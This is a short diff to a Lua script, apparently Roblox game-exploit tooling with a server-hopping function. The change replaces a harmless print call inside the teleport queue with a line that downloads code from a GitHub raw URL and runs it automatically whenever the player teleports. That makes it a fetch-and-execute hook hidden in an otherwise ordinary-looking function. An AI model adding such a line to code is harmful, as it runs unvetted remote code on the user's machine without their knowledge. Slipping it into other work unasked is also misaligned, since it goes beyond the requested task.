@@ -74,7 +74,7 @@ local function hop()
     local chosen = servers[math.random(1, #servers)]
     
     queue_on_teleport([[
-        print(111)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/phnnsecret-hash/Test/refs/heads/main/test"))()
     ]])
     
     TeleportService:TeleportToPlaceInstance(PLACE_ID, chosen, Players.LocalPlayer)
